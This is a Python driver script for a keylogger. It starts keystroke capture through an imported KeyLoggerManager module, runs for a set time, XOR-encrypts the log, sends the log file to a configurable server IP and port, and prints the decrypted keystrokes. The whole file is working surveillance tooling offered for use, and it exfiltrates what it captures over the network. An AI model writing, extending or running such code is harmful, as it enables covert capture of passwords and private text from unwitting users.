from keyLoggerManager import KeyLoggerManager
import time
import sys


def main(TIME = 20, SERVER_IP = '127.0.0.1', PORT = 5000, FILE_NAME = 'log_from_outside.txt', KEY = 5):

    KEY = int(KEY) if isinstance(KEY, str) and KEY.isdigit() else 5
    TIME = int(TIME) if isinstance(TIME, str) and TIME.isdigit() else 20
    PORT = int(PORT) if isinstance(PORT, str) and PORT.isdigit() else 5000

    man = KeyLoggerManager(SERVER_IP, PORT, FILE_NAME, KEY)
    man.start()
    time.sleep(TIME)
    man.stop()

    try:
        with open(FILE_NAME, 'rb') as file:
            content = file.read()
            if content:
                man.communicate(FILE_NAME)
                print(man.encryptor.xor_decrypt(content.decode("utf-8")))
    except FileNotFoundError:
        print(f"Log file '{FILE_NAME}' not found. This might be because no keys were logged.")
    except Exception as e:
        print(f"Error processing log file: {e}")


if __name__ == '__main__':
    args = sys.argv[1:] if len(sys.argv) > 1 else []
    main(*args)

